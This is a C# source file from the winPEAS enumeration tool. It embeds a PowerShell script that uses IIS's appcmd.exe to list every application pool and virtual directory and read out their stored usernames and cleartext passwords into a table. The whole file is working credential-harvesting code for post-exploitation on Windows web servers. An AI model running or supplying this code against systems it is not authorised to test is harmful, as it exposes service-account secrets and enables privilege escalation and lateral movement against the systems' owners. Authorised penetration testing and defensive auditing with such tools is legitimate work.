using System;

namespace winPEAS.Info.WindowsCreds.AppCmd
{
    class AppCmd
    {
        const string ExtractAppCmdCredsScript = @"  
                # Check if appcmd.exe exists
                if (Test-Path  ('%APPCMD%')) {
                    # Create data table to house results
                    $DataTable = New-Object System.Data.DataTable

                    # Create and name columns in the data table
                    $Null = $DataTable.Columns.Add('user')
                    $Null = $DataTable.Columns.Add('pass')
                    $Null = $DataTable.Columns.Add('type')
                    $Null = $DataTable.Columns.Add('vdir')
                    $Null = $DataTable.Columns.Add('apppool')

                    # Get list of application pools
                    Invoke-Expression '%APPCMD% list apppools /text:name' | ForEach-Object {

                        # Get application pool name
                        $PoolName = $_

                        # Get username
                        $PoolUserCmd = '%APPCMD% list apppool ' + $PoolName + ' /text:processmodel.username'
                        $PoolUser = Invoke-Expression $PoolUserCmd

                        # Get password
                        $PoolPasswordCmd = '%APPCMD% list apppool ' + $PoolName + ' /text:processmodel.password'
                        $PoolPassword = Invoke-Expression $PoolPasswordCmd

                        # Check if credentials exists
                        if (($PoolPassword -ne '') -and ($PoolPassword -isnot [system.array])) {
                            # Add credentials to database
                            $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
                        }
                    }

                    # Get list of virtual directories
                    Invoke-Expression '%APPCMD% list vdir /text:vdir.name' | ForEach-Object {

                        # Get Virtual Directory Name
                        $VdirName = $_

                        # Get username
                        $VdirUserCmd = '%APPCMD% list vdir ' + $VdirName + ' /text:userName'
                        $VdirUser = Invoke-Expression $VdirUserCmd

                        # Get password
                        $VdirPasswordCmd = '%APPCMD% list vdir ' + $VdirName + ' /text:password'
                        $VdirPassword = Invoke-Expression $VdirPasswordCmd

                        # Check if credentials exists
                        if (($VdirPassword -ne '') -and ($VdirPassword -isnot [system.array])) {
                            # Add credentials to database
                            $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
                        }
                    }

                    # Check if any passwords were found
                    if( $DataTable.rows.Count -gt 0 ) {
                        # Display results in list view that can feed into the pipeline
                        #$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
                        $DataTable | Select-Object user,pass,type,vdir,apppool
                    }
                    else {
                        # Status user
                        Write-host 'No application pool or virtual directory passwords were found.'                        
                    }
                }
            ";

        public static string GetExtractAppCmdCredsPowerShellScript()
        {
            var appCmdPath = Environment.ExpandEnvironmentVariables(@"%systemroot%\system32\inetsrv\appcmd.exe");

            return ExtractAppCmdCredsScript.Replace("%APPCMD%", appCmdPath);
        }
    }
}
